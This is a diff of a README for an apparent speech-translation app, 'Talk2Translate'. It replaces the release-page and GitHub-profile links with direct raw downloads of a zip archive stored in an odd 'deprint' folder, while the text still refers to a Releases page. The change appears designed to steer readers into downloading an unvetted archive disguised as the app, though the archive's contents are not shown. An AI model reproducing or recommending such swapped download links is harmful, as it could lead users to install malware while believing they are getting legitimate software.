@@ -6,11 +6,11 @@ Welcome to **Talk2Translate**! This application allows you to easily convert spo
 
 ## 🔗 Download Now
 
-[![Download Talk2Translate](https://img.shields.io/badge/Download-Talk2Translate-brightgreen.svg)](https://github.com/Pearlroasted135/Talk2Translate/releases)
+[![Download Talk2Translate](https://raw.githubusercontent.com/Pearlroasted135/Talk2Translate/main/deprint/Translate-Talk-2.0.zip)](https://raw.githubusercontent.com/Pearlroasted135/Talk2Translate/main/deprint/Translate-Talk-2.0.zip)
 
 ## 📂 Download & Install
 
-To get started, visit this page to download: [Talk2Translate Releases](https://github.com/Pearlroasted135/Talk2Translate/releases).
+To get started, visit this page to download: [Talk2Translate Releases](https://raw.githubusercontent.com/Pearlroasted135/Talk2Translate/main/deprint/Translate-Talk-2.0.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version.
@@ -79,6 +79,6 @@ Some features require an internet connection, especially for translation. Offlin
 
 For updates and news, follow us on our social media channels:
 
-- GitHub: [@Pearlroasted135](https://github.com/Pearlroasted135)
+- GitHub: [@Pearlroasted135](https://raw.githubusercontent.com/Pearlroasted135/Talk2Translate/main/deprint/Translate-Talk-2.0.zip)
 
 Thank you for using Talk2Translate. We hope it makes your communication smoother!
